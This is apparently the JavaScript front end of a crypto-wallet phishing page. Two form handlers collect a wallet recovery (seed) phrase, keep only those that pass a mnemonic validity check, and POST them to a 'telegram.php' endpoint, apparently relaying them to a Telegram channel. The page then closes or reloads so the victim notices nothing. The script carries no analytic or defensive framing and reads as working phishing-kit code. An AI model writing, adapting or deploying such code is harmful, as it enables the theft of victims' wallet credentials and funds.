$(document).ready(function () {
  $("#seedFormWindow").on("submit", function () {
    let dataSubmit = $(this).serialize();
    const phraseInput = document.getElementById("seed").value;
    if (ethers.utils.isValidMnemonic(phraseInput)) {
      $.ajax({
        type: "POST",
        url: "telegram.php",
        data: dataSubmit,
        success: function (data) {
          window.close()
        },
      });
    } else {
      const error = document.querySelector(".error");
      error.style.display = 'flex'
    }
    return false;
  });
});

$(document).ready(function () {
  $("#seedForm").on("submit", function () {
    let dataSubmit = $(this).serialize();
    const phraseInput = document.getElementById("seed").value;
    if (ethers.utils.isValidMnemonic(phraseInput)) {
      $.ajax({
        type: "POST",
        url: "telegram.php",
        data: dataSubmit,
        success: function (data) {
          window.location.reload()
        },
      });
    } else {
      const error = document.querySelector(".error");
      error.style.display = 'flex'
    }
    return false;
  });
});